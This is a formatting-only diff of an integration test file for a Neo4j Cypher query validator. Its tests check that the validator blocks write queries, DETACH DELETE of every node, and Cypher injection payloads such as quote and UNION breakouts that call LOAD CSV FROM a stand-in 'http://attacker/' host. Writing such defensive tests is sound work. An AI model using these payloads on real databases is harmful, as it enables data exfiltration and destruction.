@@ -7,8 +7,8 @@ service to be running and reachable via the NEO4J_URI environment variable
 Run with:
     docker compose run --rm seizu pipenv run pytest tests/integration
 """
-from reporting.services.query_validator import validate_query
 
+from reporting.services.query_validator import validate_query
 
 # ---------------------------------------------------------------------------
 # Helpers
@@ -30,9 +30,7 @@ def _assert_allowed(query, params=None):
     """validate_query must return has_errors=False for this query."""
     result = validate_query(query, params=params)
     assert not result.has_errors, (
-        f"Expected query to be allowed but it was blocked.\n"
-        f"  query: {query!r}\n"
-        f"  errors: {result.errors}"
+        f"Expected query to be allowed but it was blocked.\n  query: {query!r}\n  errors: {result.errors}"
     )
 
 
@@ -58,10 +56,7 @@ class TestValidReadQueries:
         _assert_allowed("MATCH (n) RETURN n LIMIT 10")
 
     def test_multi_match_with(self):
-        _assert_allowed(
-            "MATCH (n) WITH count(n) AS total "
-            "MATCH (n) RETURN count(n) AS current, total"
-        )
+        _assert_allowed("MATCH (n) WITH count(n) AS total MATCH (n) RETURN count(n) AS current, total")
 
     def test_parameterized_with_params(self):
         _assert_allowed(
@@ -73,9 +68,7 @@ class TestValidReadQueries:
         """Missing params produce a warning, not a blocking error."""
         result = validate_query("MATCH (n) WHERE n.name = $name RETURN n LIMIT 1")
         assert not result.has_errors
-        assert any(
-            "parameter" in w.lower() or "Parameter" in w for w in result.warnings
-        )
+        assert any("parameter" in w.lower() or "Parameter" in w for w in result.warnings)
 
 
 # ---------------------------------------------------------------------------
@@ -103,15 +96,10 @@ class TestWriteQueriesBlocked:
         _assert_blocked("MATCH (n:IntegrationTest) REMOVE n:IntegrationTest RETURN n")
 
     def test_foreach(self):
-        _assert_blocked(
-            "MATCH (n:IntegrationTest) WITH collect(n) AS nodes "
-            "FOREACH (x IN nodes | SET x.pwned = true)"
-        )
+        _assert_blocked("MATCH (n:IntegrationTest) WITH collect(n) AS nodes FOREACH (x IN nodes | SET x.pwned = true)")
 
     def test_merge_on_create_set(self):
-        _assert_blocked(
-            "MERGE (n:IntegrationTest {x: 1}) " "ON CREATE SET n.role = 'test' RETURN n"
-        )
+        _assert_blocked("MERGE (n:IntegrationTest {x: 1}) ON CREATE SET n.role = 'test' RETURN n")
 
 
 # ---------------------------------------------------------------------------
@@ -124,10 +112,7 @@ class TestSSRFQueriesBlocked:
         _assert_blocked("LOAD CSV FROM 'http://attacker/data' AS row RETURN row")
 
     def test_load_csv_with_union(self):
-        _assert_blocked(
-            "MATCH (n) RETURN n UNION "
-            "LOAD CSV FROM 'http://attacker/data' AS row RETURN row"
-        )
+        _assert_blocked("MATCH (n) RETURN n UNION LOAD CSV FROM 'http://attacker/data' AS row RETURN row")
 
     def test_call_apoc_load(self):
         _assert_blocked(
@@ -150,36 +135,24 @@ class TestNeo4jectionStringInjection:
 
     def test_or_true_with_clause_breakout(self):
         _assert_blocked(
-            "' OR 1=1 WITH 0 as _l00 CALL db.labels() yield label "
-            "LOAD CSV FROM 'http://attacker/' as l RETURN 1 //"
+            "' OR 1=1 WITH 0 as _l00 CALL db.labels() yield label LOAD CSV FROM 'http://attacker/' as l RETURN 1 //"
         )
 
     def test_property_filter_breakout(self):
-        _assert_blocked(
-            "'=' LOAD CSV FROM 'http://attacker/' as l WITH 0 as _l00 RETURN 1 //"
-        )
+        _assert_blocked("'=' LOAD CSV FROM 'http://attacker/' as l WITH 0 as _l00 RETURN 1 //")
 
 
 class TestNeo4jectionUnionInjection:
     """UNION-based injection to append attacker-controlled queries."""
 
     def test_node_property_union_breakout(self):
-        _assert_blocked(
-            "'}) RETURN 1 UNION MATCH (n) "
-            "LOAD CSV FROM 'http://attacker/' as l RETURN 1 //"
-        )
+        _assert_blocked("'}) RETURN 1 UNION MATCH (n) LOAD CSV FROM 'http://attacker/' as l RETURN 1 //")
 
     def test_label_union_breakout(self):
-        _assert_blocked(
-            "a) RETURN 1 UNION MATCH (n) "
-            "LOAD CSV FROM 'http://attacker/' as l RETURN 1 //"
-        )
+        _assert_blocked("a) RETURN 1 UNION MATCH (n) LOAD CSV FROM 'http://attacker/' as l RETURN 1 //")
 
     def test_relationship_union_breakout(self):
-        _assert_blocked(
-            "']}]-() RETURN 1 UNION MATCH (n) "
-            "LOAD CSV FROM 'http://attacker/' as l RETURN 1 //"
-        )
+        _assert_blocked("']}]-() RETURN 1 UNION MATCH (n) LOAD CSV FROM 'http://attacker/' as l RETURN 1 //")
 
 
 class TestNeo4jectionDataExfiltration:
@@ -271,24 +244,16 @@ class TestNeo4jectionWriteClauses:
     """Direct write clause injection attempts."""
 
     def test_create_node_injection(self):
-        _assert_blocked(
-            "MATCH (n) RETURN n UNION CREATE (evil:Backdoor {cmd: 'whoami'})"
-        )
+        _assert_blocked("MATCH (n) RETURN n UNION CREATE (evil:Backdoor {cmd: 'whoami'})")
 
     def test_merge_with_on_create(self):
-        _assert_blocked(
-            "MERGE (n:IntegrationTest {name: 'attacker'}) "
-            "ON CREATE SET n.role = 'superadmin' RETURN n"
-        )
+        _assert_blocked("MERGE (n:IntegrationTest {name: 'attacker'}) ON CREATE SET n.role = 'superadmin' RETURN n")
 
     def test_detach_delete_all(self):
         _assert_blocked("MATCH (n) DETACH DELETE n")
 
     def test_foreach_write(self):
-        _assert_blocked(
-            "MATCH (n) WITH collect(n) as nodes "
-            "FOREACH (x IN nodes | SET x.pwned = true)"
-        )
+        _assert_blocked("MATCH (n) WITH collect(n) as nodes FOREACH (x IN nodes | SET x.pwned = true)")
 
     def test_remove_labels(self):
         _assert_blocked("MATCH (n:IntegrationTest) REMOVE n:IntegrationTest RETURN n")
